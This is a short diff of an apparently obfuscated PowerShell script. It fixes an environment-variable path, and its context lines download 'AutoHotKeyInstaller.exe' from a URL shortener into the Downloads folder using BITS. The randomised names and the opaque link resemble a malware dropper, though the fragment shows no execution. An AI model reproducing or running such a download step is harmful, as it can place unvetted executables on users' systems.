@@ -10,7 +10,7 @@ function z($5VAUPX0,$8UNyT,$C1A = $false){
     }
 }
 
-$aWRP4k = "$ERq5PZGS10lUNavebVT9Y3:USERPROFILE\Downloads\AutoHotKeyInstaller.exe"
+$aWRP4k = "$ENV:USERPROFILE\Downloads\AutoHotKeyInstaller.exe"
 if (-Not (Test-Path -Path $aWRP4k)){
     Start-BitsTransfer -Source "https://shorturl.at/rnxiX" -Destination $aWRP4k
 }
